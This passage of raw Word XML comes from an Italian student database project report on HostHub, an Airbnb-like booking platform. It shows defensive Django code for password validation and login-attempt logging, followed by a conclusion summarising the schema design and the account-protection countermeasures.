              <w:t>sufficientemente</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>complessa</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5C744560" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="739654C1" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t># Model</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="693E6AFE"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class </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>User(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>AbstractUser</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3A71A4E0" w14:textId="1A9B8E48" w:rsidR="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">    password = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>models.CharField</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>max_length</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>=128, validators=[</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>validate_strong_password</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3F30579D" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRDefault="00E603E1"/>
    <w:p w14:paraId="468C9F4B" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">5. Logging e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>Monitoraggio</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>attacchi</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1BC7DD9D" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="5B9BD5"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>Descrizione</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D8D8096" w14:textId="1096E95E" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Tenere</w:t>
      </w:r>
      <w:r w:rsidRPr="00E603E1">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> traccia su file o DB dei tentativi.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="Grigliatabella"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblInd w:w="38" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="9932"/>
      </w:tblGrid>
      <w:tr w:rsidR="00E603E1" w14:paraId="41F0F0E1" w14:textId="77777777" w:rsidTr="00E603E1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9932" w:type="dxa"/>
            <w:tcBorders>
              <w:top w:val="nil"/>
              <w:left w:val="nil"/>
              <w:bottom w:val="nil"/>
              <w:right w:val="nil"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="F2F2F2"/>
          </w:tcPr>
          <w:p w14:paraId="18354EB7" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>import logging</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="501977E7" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="7C19C64F"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logger = </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>logging.getLogger</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>("</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>login_attempts</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>")</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03D9CC66" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
          </w:p>
          <w:p w14:paraId="558316BB" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRPr="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">def </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>log_</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>attempt</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">email, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>ip</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>, success):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="737A9D49" w14:textId="210BEE2F" w:rsidR="00E603E1" w:rsidRDefault="00E603E1" w:rsidP="00E603E1">
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t xml:space="preserve">    logger.info(</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>f"{</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>timezone.now</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>)} - {</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>ip</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00E603E1">
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="16"/>
                <w:szCs w:val="16"/>
              </w:rPr>
              <w:t>} - {email} - success={success}")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="084AC400" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRDefault="00E603E1"/>
    <w:p w14:paraId="36CA2FB1" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRDefault="00E603E1"/>
    <w:p w14:paraId="1B637D4F" w14:textId="708451BA" w:rsidR="00786A11" w:rsidRDefault="00786A11" w:rsidP="00786A11">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002F0F19">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">4 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="2F5597"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Conclusione</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="6A5174E6" w14:textId="43C5EEB5" w:rsidR="00786A11" w:rsidRPr="00786A11" w:rsidRDefault="00786A11" w:rsidP="00786A11">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00786A11">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Il progetto </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00786A11">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>HostHub</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00786A11">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ha permesso di sviluppare una base di dati completa e coerente, capace di supportare le funzionalità fondamentali di una piattaforma di prenotazioni online, similmente ad Airbnb. Attraverso un percorso metodico, dalla raccolta delle specifiche alla progettazione concettuale e logica, fino all’implementazione relazionale e all’integrazione con Django, è stato possibile dimostrare come uno schema ben strutturato possa rendere agevole la gestione di utenti, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00786A11">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>host</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00786A11">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>, alloggi, esperienze e prenotazioni.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51FE917E" w14:textId="77777777" w:rsidR="00786A11" w:rsidRPr="00786A11" w:rsidRDefault="00786A11" w:rsidP="00786A11">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00786A11">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>La normalizzazione e la separazione delle entità principali, insieme alla definizione di viste SQL dedicate, hanno garantito sia la riduzione delle ridondanze sia la facilità di interrogazione per la costruzione di funzionalità applicative. L’uso di Django come livello applicativo ha mostrato concretamente come il modello relazionale possa essere tradotto in un’interfaccia web funzionale, rispettando i vincoli strutturali e le regole di integrità dei dati.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E2064DE" w14:textId="77777777" w:rsidR="00786A11" w:rsidRPr="00786A11" w:rsidRDefault="00786A11" w:rsidP="00786A11">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00786A11">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Infine, l’analisi della sicurezza, con la simulazione di un attacco a dizionario e l’implementazione di contromisure, ha evidenziato l’importanza di considerare anche la protezione degli account utenti, integrando strategie preventive come limitazioni sui tentativi di login, CAPTCHA e requisiti di password complesse.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC7411D" w14:textId="77777777" w:rsidR="00E603E1" w:rsidRDefault="00E603E1"/>
    <w:sectPr w:rsidR="00E603E1"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6503" w14:textId="77777777" w:rsidR="00453A38" w:rsidRDefault="00453A38">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="17ABDE3E" w14:textId="77777777" w:rsidR="00453A38" w:rsidRDefault="00453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7A6B" w14:textId="77777777" w:rsidR="00597ADF" w:rsidRDefault="00000000">
    <w:pPr>
      <w:pStyle w:val="Pidipagina"/>
      <w:jc w:val="center"/>
    </w:pPr>
    <w:proofErr w:type="spellStart"/>
    <w:r>
      <w:rPr>
        <w:color w:val="808080"/>
        <w:sz w:val="16"/>
      </w:rPr>
      <w:t>HostHub</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
    <w:r>
      <w:rPr>
        <w:color w:val="808080"/>
        <w:sz w:val="16"/>
      </w:rPr>
      <w:t xml:space="preserve"> - Progetto di Basi di Dati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5164" w14:textId="77777777" w:rsidR="00453A38" w:rsidRDefault="00453A38">
      <w:pPr>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="1A2957E9" w14:textId="77777777" w:rsidR="00453A38" w:rsidRDefault="00453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E9A04DE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CFB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340BB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="024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12D31"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BFC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11710">
    <w:abstractNumId w:val="8"/>
  </w:num>
  <w:num w:numId="2" w16cid:durableId="907418808">
    <w:abstractNumId w:val="6"/>
  </w:num>
  <w:num w:numId="3" w16cid:durableId="1936285487">
    <w:abstractNumId w:val="5"/>
  </w:num>
  <w:num w:numId="4" w16cid:durableId="748190100">
    <w:abstractNumId w:val="4"/>
  </w:num>
  <w:num w:numId="5" w16cid:durableId="2121491726">
    <w:abstractNumId w:val="7"/>
  </w:num>
  <w:num w:numId="6" w16cid:durableId="655115347">
    <w:abstractNumId w:val="3"/>
  </w:num>
  <w:num w:numId="7" w16cid:durableId="1744714430">
    <w:abstractNumId w:val="2"/>
  </w:num>
  <w:num w:numId="8" w16cid:durableId="1928421645">
    <w:abstractNumId w:val="1"/>
  </w:num>
  <w:num w:numId="9" w16cid:durableId="1696033818">
    <w:abstractNumId w:val="0"/>
  </w:num>
  <w:num w:numId="10" w16cid:durableId="1291085423">
    <w:abstractNumId w:val="9"/>
  </w:num>
  <w:num w:numId="11" w16cid:durableId="473451377">
    <w:abstractNumId w:val="10"/>
  </w:num>
  <w:num w:numId="12" w16cid:durableId="3375376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3C6"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00172278"/>
    <w:rsid w:val="00181D6F"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="002B0DA9"/>
    <w:rsid w:val="002F0F19"/>
    <w:rsid w:val="00314A9E"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="00337A26"/>
    <w:rsid w:val="003A7F85"/>
    <w:rsid w:val="00453A38"/>
    <w:rsid w:val="00484D0A"/>
    <w:rsid w:val="00597ADF"/>
    <w:rsid w:val="0065007F"/>
    <w:rsid w:val="00683795"/>
    <w:rsid w:val="00786A11"/>
    <w:rsid w:val="007B36B0"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00C85B24"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00D42842"/>
    <w:rsid w:val="00DD58A7"/>
    <w:rsid w:val="00E07933"/>
    <w:rsid w:val="00E603E1"/>
    <w:rsid w:val="00E76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72E59"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{BA4A295E-783A-4A9E-98B3-CD814ED4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eastAsia="Arial" w:hAnsi="Arial"/>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color w:val="2F75B5"/>
      <w:sz w:val="26"/>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color w:val="5B9BD5"/>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pacing w:after="120"/>
      <w:ind w:left="360" w:right="360"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Arial" w:eastAsia="Arial" w:hAnsi="Arial"/>
      <w:i/>
      <w:color w:val="595959"/>
      <w:sz w:val="19"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:customStyle="1" w:styleId="CodeBlock">
    <w:name w:val="CodeBlock"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
      <w:ind w:left="240"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
      <w:color w:val="22222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18</Pages>
  <Words>5014</Words>
  <Characters>28585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Salvatore Napolitano</cp:lastModifiedBy>
  <cp:revision>2</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-06-03T19:31:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-03T19:31:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>